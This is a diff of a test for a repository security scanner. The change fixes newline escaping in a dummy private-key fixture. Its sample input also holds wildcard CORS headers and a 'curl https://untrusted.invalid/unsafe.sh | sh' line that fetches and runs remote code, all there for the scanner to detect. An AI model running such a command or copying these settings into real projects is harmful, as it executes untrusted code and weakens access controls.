@@ -54,7 +54,7 @@ test("repository security inventory finds every occurrence and prohibits unsafe 
   const source = [
     "Access-Control-Allow-Origin: *",
     "Access-Control-Allow-Origin: *",
-    "-----BEGIN PRIVATE KEY-----\\nQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB\\n-----END PRIVATE KEY-----",
+    "-----BEGIN PRIVATE KEY-----\nQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB\n-----END PRIVATE KEY-----",
     "curl https://untrusted.invalid/unsafe.sh | sh"
   ].join("\n");
   const events = scanDangerous("ghostftp-desktop/src-tauri/src/bridge.rs", source);
